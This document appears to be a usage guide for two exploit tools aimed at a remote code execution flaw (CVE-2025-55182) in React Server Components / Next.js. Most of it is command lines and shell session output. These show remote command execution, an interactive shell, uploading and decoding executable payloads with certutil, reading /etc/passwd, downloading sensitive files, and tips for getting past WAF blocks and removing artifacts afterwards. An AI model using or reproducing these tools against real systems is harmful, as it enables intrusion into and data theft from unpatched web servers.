# CVE-2025-55182 Exploitation Guide

Quick guide for `exploit.py` and `interactive_exploit.py` - React Server Components RCE exploitation tools.

## Tool Overview

### exploit.py

Single-shot command execution. Perfect for automation and scripting.

### interactive_exploit.py

Interactive shell session. Perfect for manual exploration and persistence.

---

## Basic Usage

### exploit.py - Single Command

```bash
# Basic command execution
python exploit.py -t http://target.com -c "whoami"

# Custom timeout
python exploit.py -t http://target.com -c "dir" -T 30

# Upload base64-encoded file
python exploit.py -t http://target.com -f payload.b64
```

**Arguments:**

- `-t, --target URL` - Target URL (required for non-default)
- `-c, --command CMD` - Command to execute
- `-f, --upload-file FILE` - Upload base64-encoded file (saves as `out.b64`)
- `-T, --timeout SEC` - Request timeout in seconds (default: 15)

### interactive_exploit.py - Interactive Shell

```bash
# Start interactive shell
python interactive_exploit.py -t http://target.com

# With custom timeout
python interactive_exploit.py -t http://target.com -T 30
```

**Built-in Commands:**

- `help` - Show help message
- `info` - Gather target system information
- `upload <file>` - Upload base64-encoded file
- `download <file>` - Download file from target
- `timeout [sec]` - Show/set timeout (e.g., `timeout 30`)
- `history` - Show command history
- `clear` - Clear screen
- `exit/quit` - Exit shell

**System Commands:**
Any other input is executed as a system command on the target.

---

## Advanced Features

### File Upload Workflow

**1. Encode file locally:**

```powershell
# PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("payload.exe")) | Out-File payload.b64

# Bash
base64 payload.bin > payload.b64
```

**2. Upload to target:**

```bash
# Single-shot
python exploit.py -t http://target.com -f payload.b64

# Interactive
rce @ target.com #1 > upload payload.b64
```

**3. Decode on target:**

```bash
# Windows
certutil -decode out.b64 payload.exe

# Linux
base64 -d out.b64 > payload.bin
```

### File Download

```bash
# Interactive shell only
rce @ target.com #1 > download package.json
[+] File saved to: downloaded_package.json
```

### Dynamic Timeout Adjustment

```bash
# Show current timeout
rce @ target.com #1 > timeout
[*] Current timeout: 15 seconds

# Set new timeout
rce @ target.com #2 > timeout 60
[+] Timeout changed: 15s -> 60s

# Now execute slow commands
rce @ target.com #3 > powershell -c "Get-Process | Export-Csv out.csv"
```

---

## Practical Examples

### Windows Target

```bash
# Reconnaissance
python exploit.py -t http://target.com -c "whoami"
python exploit.py -t http://target.com -c "hostname"
python exploit.py -t http://target.com -c "ipconfig"

# File operations
python exploit.py -t http://target.com -c "dir C:\\"
python exploit.py -t http://target.com -c "type C:\\Windows\\System32\\drivers\\etc\\hosts"

# PowerShell
python exploit.py -t http://target.com -c "powershell -c pwd"
python exploit.py -t http://target.com -c "powershell -c Get-Process"
```

### Linux Target

```bash
# Reconnaissance
python exploit.py -t http://target.com -c "uname -a"
python exploit.py -t http://target.com -c "id"
python exploit.py -t http://target.com -c "pwd"

# File operations
python exploit.py -t http://target.com -c "ls -la"
python exploit.py -t http://target.com -c "cat /etc/passwd"

# Network
python exploit.py -t http://target.com -c "ifconfig"
python exploit.py -t http://target.com -c "netstat -tlnp"
```

### Interactive Session Example

```bash
$ python interactive_exploit.py -t http://target.com

╔══════════════════════════════════════════════════════════╗
║  CVE-2025-55182 Interactive Exploitation Shell           ║
╚══════════════════════════════════════════════════════════╝

[+] Target: http://target.com
[+] Connection established!

rce @ target.com #1 > info
Request Timeout     : 15s
Commands Executed   : 1
────────────────────────────────────────────────────────────
OS Info             : Microsoft Windows [Version 10.0...]
Current User        : DESKTOP-XYZ\admin
Hostname            : DESKTOP-XYZ
Current Directory   : C:\app

rce @ target.com #2 > timeout 30

rce @ target.com #3 > dir

rce @ target.com #4 > upload malicious.b64
[+] File uploaded successfully -> out.b64

rce @ target.com #5 > certutil -decode out.b64 malicious.exe

rce @ target.com #6 > download sensitive.txt
[+] File saved to: downloaded_sensitive.txt

rce @ target.com #7 > exit
```

---

## Troubleshooting

### "Connection timeout"

- Increase timeout: `-T 60`
- Check if target is accessible
- Verify firewall/WAF not blocking

### "Invalid character in header"

- Use simple commands without special characters
- Avoid quotes in PowerShell commands: use `ls` instead of `Get-ChildItem`
- The tool auto-encodes output in base64 to prevent this

### "Server Error / HTTP 500"

- Target may not be vulnerable
- Try simpler commands like `whoami` or `dir`
- Check if payload contains problematic characters (single quotes)

### "Target rejected payload"

- Verify target is running vulnerable Next.js version
- Check if WAF/IPS is blocking
- Try different command syntax

### Upload failed

- Ensure file is base64-encoded (not binary)
- Check file size (very large files may timeout)
- Verify read permissions on local file

---

## Tips & Best Practices

1. **Start with simple commands** - Test with `whoami` before complex operations
2. **Use interactive shell for exploration** - Better for multi-step operations
3. **Use single-shot for automation** - Better for scripting and integration
4. **Adjust timeout for slow commands** - Increase for file operations, exports
5. **Avoid special characters** - Use simple command syntax when possible
6. **Test locally first** - Verify payload works on test environment
7. **Clean up artifacts** - Remove uploaded files after use
